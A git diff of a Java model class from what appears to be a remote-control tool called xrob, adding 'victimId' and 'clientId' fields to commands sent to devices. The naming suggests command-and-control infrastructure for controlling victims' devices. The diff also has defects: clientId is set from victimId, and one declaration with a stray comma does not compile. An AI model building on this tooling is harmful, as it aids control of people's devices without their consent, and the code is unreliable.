@@ -1,6 +1,6 @@
 package com.theah64.xrob.api.models;
 
-import com.theah64.xrob.api.database.tables.Commands;
+import com.theah64.xrob.api.database.tables.command.Commands;
 import com.theah64.xrob.api.utils.FCMUtils;
 import com.theah64.xrob.api.utils.clientpanel.TimeUtils;
 import org.json.JSONException;
@@ -16,14 +16,20 @@ public class Command {
     public static final String COMMAND_NOTIFY = "notify";
     public static final String REGEX_VALID_COMMAND = "^xrob\\s(?:notify).+";
 
-    private final String id, command, relativeEstablishedTime;
+    private String id;
+    private final String command;
+    private final String relativeEstablishedTime;
+    private final String victimId;
+    private final String clientId;
     private final List<Status> statuses;
 
-    public Command(String id, String command, long reportedAt, List<Status> statuses) {
+    public Command(String id, String command, long reportedAt, List<Status> statuses, String victimId, String clientId) {
         this.id = id;
         this.command = command;
         this.relativeEstablishedTime = TimeUtils.getRelativeTime(reportedAt);
         this.statuses = statuses;
+        this.victimId = victimId;
+        this.clientId = victimId;
     }
 
     public String getCommand() {
@@ -77,9 +83,21 @@ public class Command {
         return id;
     }
 
+    public void setId(String id) {
+        this.id = id;
+    }
+
+    public String getClientId() {
+        return clientId;
+    }
+
+    public String getVictimId() {
+        return victimId;
+    }
+
     public static class Status {
 
-        private final String status, statusMessage, relativeReportTime;
+        private final String status, statusMessage, relativeReportTime, ;
 
         public Status(String status, String statusMessage, long reportedAt) {
             this.status = status;
